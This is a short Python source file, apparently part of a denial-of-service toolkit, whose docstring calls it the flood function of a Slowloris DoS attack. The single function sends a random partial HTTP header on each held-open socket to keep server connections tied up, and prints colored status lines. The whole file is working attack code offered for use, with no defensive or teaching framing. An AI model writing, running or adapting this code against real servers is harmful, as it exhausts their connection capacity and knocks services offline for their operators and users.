"""This module provides the flood function for a Slowloris DoS attack."""

import random
import socket

from colorama import Fore as F


def flood(sock: socket.SocketType) -> None:
    """Keep the sockets alive in Slowloris flood.

    Args:
        - sock - The socket to be kept alive

    Returns:
        None
    """
    laddr, port = sock.getsockname()
    random_header = random.randint(1, 5000)
    sock.send(f"X-a: {random_header}".encode("utf-8"))
    header_sent = f"{F.RESET} Header Sent:{F.BLUE} X-a {random_header:>4}"
    print(
        f"{F.RESET} --> Socket: {F.BLUE}{laddr}:{port} {F.RESET}|{header_sent} {F.RESET}"
    )
